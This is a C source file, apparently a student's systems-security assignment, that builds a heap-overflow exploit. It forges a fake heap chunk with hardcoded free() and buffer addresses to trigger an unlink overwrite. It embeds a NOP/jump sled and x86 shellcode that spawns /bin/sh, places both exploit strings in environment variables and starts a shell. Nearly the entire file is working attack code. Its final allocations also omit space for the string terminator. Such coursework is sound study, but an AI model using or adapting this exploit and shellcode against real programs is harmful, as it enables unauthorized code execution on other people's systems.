// Program: heapexp.c
// Assignment 2 - Systems Security
// Matthew Kramer, U20891900

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define BUF_SIZE 128
#define ENV_STRING1 "EXP1="
#define ENV_STRING2 "EXP2="

int main(int argc, char *argv[])
{
    long where = 0x08049c90;    // Offset of free()
    long what = 0x08049e28;     // Location of buffer
    long next = 0xffffffff;     // Next chunk size
    long *pointer;              // Pointer for inputting addresses

    int offset1;                // Offset for first environment variable
    int offset2;                // Offset for second environment variable
    int size1;                  // Size of first exploit string
    int size2;                  // Size of second exploit string

    char *buffer1;              // Temporary working string
    char *buffer2;              // Temporary working string
    char *EXP1;                 // Final exploit string
    char *EXP2;                 // Final exploit string

    // Placeholders for forward and back links (8 bytes)
    char prefix[] = "XXXXYYYY";

    // 6 NOPs followed by the JMP + 4 instruction (8 bytes)
    char nop_jmp[] = "\x90\x90\x90\x90\x90\x90\xeb\x04";

    // Unlinking overwrite occurs here (4 bytes)
    char overwrite[] = "ZZZZ";

    // Exploit shell code (45 bytes)
    char shellcode[] =  "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c"
                        "\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb"
                        "\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh";

    // Padding (14 bytes)
    char padding[] = "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90";

    // Allocate first buffer
    if(!(buffer1 = malloc(BUF_SIZE)))
    {
        printf("Unable to allocate temporary buffer.\n");
        return 0;
    }

    // Copy prefix into first exploit string
    strcpy(buffer1, prefix);

    // Concatenate nop/jmp sequence into first exploit string
    strcat(buffer1, nop_jmp);

    // Copy overwrite into first exploit string
    strcat(buffer1, overwrite);

    //Copy shellcode into first exploit string
    strcat(buffer1, shellcode);

    // Allocate second buffer
    if(!(buffer2 = malloc(BUF_SIZE)))
    {
        printf("Unable to allocate temporary buffer.\n");
        return 0;
    }

    // Add padding to the beginning of second exploit string
    strcpy(buffer2, padding);

    // Create fake heap structure within second exploit string
    pointer = (long *)(buffer2 + strlen(buffer2));
    *pointer = *(pointer + 1) = next;
    *(pointer + 2) = where - 12;
    *(pointer + 3) = what + 8;

    // Determine offsets as a result of environment variable names
    offset1 = strlen(ENV_STRING1);
    offset2 = strlen(ENV_STRING2);

    // Calculate sizes of final exploit strings
    size1 = strlen(buffer1) + offset1;
    size2 = strlen(buffer2) + offset2;

    // Allocate first exploit string, checking for successful completion
    if(!(EXP1 = malloc(size1)))
    {
        printf("Unable to allocate buffer for %s.\n", ENV_STRING1);
        return 0;
    }

    // Allocate second exploit string, checking for successful completion
    if(!(EXP2 = malloc(size2)))
    {
        printf("Unable to allocate buffer for %s.\n", ENV_STRING2);
        return 0;
    }

    // Copy environment variable name into final exploit string
    strcpy(EXP1, ENV_STRING1);
    // Concatenate rest of exploit string into final exploit string
    strcat(EXP1, buffer1);

    // Copy environment variable name into final exploit string
    strcpy(EXP2, ENV_STRING2);
    // Concatenate rest of exploit string into final exploit string
    strcat(EXP2, buffer2);

    // Put final exploit strings into the environment
    putenv(EXP1);
    putenv(EXP2);
    system("/bin/bash");

    return 0;
}
